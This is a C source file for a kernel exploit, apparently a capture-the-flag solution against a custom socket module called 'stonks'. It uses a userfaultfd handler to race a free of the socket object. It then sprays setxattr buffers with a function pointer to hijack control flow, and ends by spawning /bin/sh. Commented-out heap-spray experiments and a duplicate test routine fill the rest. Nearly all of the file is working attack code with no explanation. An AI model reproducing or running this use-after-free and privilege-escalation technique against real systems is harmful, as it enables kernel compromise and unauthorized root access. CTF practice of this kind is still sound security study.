#include "./exploit.h"
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/xattr.h>

/*********** commands ******************/

#define DEV_PATH ""   // the path the device is placed

/*********** constants ******************/

#define OPTION_CALL     0x1337
#define OPTION_PUT      0x1338
#define OPTION_DEBUG    0x1339

/****** (END constants) *****************/

#define u64 ulong

typedef union {
    // for OPTION_DEBUG
    struct {
        u64 off;
        u64 *data;
    };
    // for OPTION_CALL
    struct {
        unsigned size;
        u64 rounds;
        u64 key;
        u64 security;
    };
} option_arg_t;

#define SEQNUM 100
int psock;
int seqfds[0x100];
int hogecsock, hogessock;
struct msghdr msg = {0};
int sssock;
char buf[0x100] = {0};

void nirugiri()
{
  __asm("mov rbx, [0xaaa]");
}

static void handler(long arg) {
  puts("[+] entered handler");

  puts("[+] freeing stonks socket");
  assert(ioctl(psock, OPTION_PUT, NULL) != -EINVAL);

  //puts("[+] allocating seq_operations...");
  //for (int ix = 0; ix != SEQNUM; ++ix) {
  //  assert((seqfds[ix] = open("/proc/self/stat", O_RDONLY)) >= 2);
  //}
  //ulong hoge = 0xdeadbeef;
  //  setxattr("/bot", "NIRUGIRI", &hoge, 0x30, XATTR_CREATE);
  //  errExit("mshogeg");

  //puts("WAITING...");

  //struct  msghdr hdr = {0};
  //char buf[0x50] = {0};
  //for (int ix = 0; ix != 4; ++ix) {
  //  ((ulong*)buf)[ix] = 0xdeadbeef;
  //}
  //hdr.msg_control = buf;
  //hdr.msg_controllen = 0x40;
  //errno = 0;
  //struct sockaddr a = {0};
  //unsigned len = sizeof(a);
  //int r = accept(hogessock, &a, &len);
  //assert(r != -1);
  ////if(sendmsg(hogecsock, &hdr, 0) == -1) errExit("sendmsg");
  //assert(sendmsg(hogecsock, &hdr, 0) != -1);

  char buf[0x50] = {0};
  for (int ix = 0; ix != 4; ++ix) {
    ((ulong*)buf)[ix] = (ulong)nirugiri;
  }
  setxattr("/bot", "user.test", buf, 0x20, XATTR_CREATE);
}

void prepare() {
  //hogessock = socket(AF_INET, SOCK_STREAM, 0);
  //assert(hogessock != -1);
  //struct sockaddr_in server_addr;
  //memset(&server_addr, 0, sizeof(server_addr));
  //server_addr.sin_family = AF_INET;
  //server_addr.sin_port = htons(49495);
  //server_addr.sin_addr.s_addr = INADDR_ANY;
  //int b = bind(hogessock, &server_addr, sizeof(server_addr));
  //assert(b >= 0);
  //b = listen(hogessock, 10);
  //assert(b >= 0);

  //hogecsock = socket(AF_INET, SOCK_STREAM, 0);
  //assert(hogecsock != -1);
  //struct sockaddr_in caddr;
  //memset(&caddr, 0, sizeof(caddr));
  //caddr.sin_family = AF_INET;
  //caddr.sin_port = htons(49495);
  //caddr.sin_addr.s_addr = inet_addr("127.0.0.1");
  //assert(connect(hogecsock, &caddr, sizeof(caddr)) == 0);

  //struct sockaddr_in addr = {0};
  //for (int ix = 0; ix != 0x10; ++ix) {
  //  ((ulong*)buf)[ix] = 0xcafebabedeadbeef;
  //}
  //sssock = socket(AF_INET, SOCK_DGRAM, 0);
  //assert(sssock != -1);
  //addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  //addr.sin_family = AF_INET;
  //addr.sin_port = htons(49495);

  //msg.msg_control = buf;
  //msg.msg_controllen = 0x20;
  //msg.msg_name = &addr;
  //msg.msg_namelen = sizeof(addr);
}

int main(int argc, char *argv[]) {
  puts("[.] exploit started.");
  prepare();

  // create receiver socket
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  assert(sock != -1);
  struct sockaddr_in addr;
  struct sockaddr peer_addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(49494);
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  assert(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1);
  assert(listen(sock, 999) == 0);

  // connect to the socket
  puts("[.] creating client socket");
  int csock = socket(AF_INET, SOCK_STREAM, 0);
  assert(csock != -1);
  struct sockaddr_in caddr;
  memset(&caddr, 0, sizeof(addr));
  caddr.sin_family = AF_INET;
  caddr.sin_port = htons(49494);
  caddr.sin_addr.s_addr = inet_addr("127.0.0.1");
  assert(connect(csock, &caddr, sizeof(caddr)) == 0);

  // wait connection
  unsigned len = sizeof(peer_addr);;
  psock = accept(sock, &peer_addr, &len);
  assert(psock != -1);

  // set uffd
  char cpy_src[0x1000] = {0};
  struct skb_uffder *uffder = new_skb_uffder(0x20000, 1, cpy_src, handler, "uffder");
  skb_uffd_start(uffder, NULL);

  // set option
  write(csock, "ABCDEFG", 8);
  option_arg_t option = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 1,
  };
  assert(ioctl(psock, OPTION_CALL, &option) == 0);

  // write to socket from client
  char *bbuf = (char*)0x20000;
  recv(psock, bbuf, 0x30, 0);
  puts("[.] received");
  printf("%s\n", bbuf);
  hexdump(bbuf, 0x30);

  // end of life
  system("/bin/sh");
  puts("[ ] END of life...");
  sleep(999999);
}

void test() {
  puts("[.] exploit started.");

  // create receiver socket
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  assert(sock != -1);
  struct sockaddr_in addr;
  struct sockaddr peer_addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(49494);
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  assert(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1);
  assert(listen(sock, 999) == 0);

  // connect to the socket
  puts("[.] creating client socket");
  int csock = socket(AF_INET, SOCK_STREAM, 0);
  assert(csock != -1);
  struct sockaddr_in caddr;
  memset(&caddr, 0, sizeof(addr));
  caddr.sin_family = AF_INET;
  caddr.sin_port = htons(49494);
  caddr.sin_addr.s_addr = inet_addr("127.0.0.1");
  assert(connect(csock, &caddr, sizeof(caddr)) == 0);

  // wait connection
  unsigned len = sizeof(peer_addr);;
  int psock = accept(sock, &peer_addr, &len);
  assert(psock != -1);

  // set option

  // write to socket from client
  write(csock, "ABCDEFG", 8);
  option_arg_t option = {
    .size = 0x4,
    .rounds = 1,
    .key = 0xdeadbeef,
    .security = 1,
  };
  assert(ioctl(psock, OPTION_CALL, &option) == 0);
  char bbuf[0x30] = {0};
  recv(psock, bbuf, 0x30, 0);
  puts("[.] received");
  printf("%s\n", bbuf);
  hexdump(bbuf, 0x30);

  // end of life
  puts("[ ] END of life...");
  sleep(999999);
}
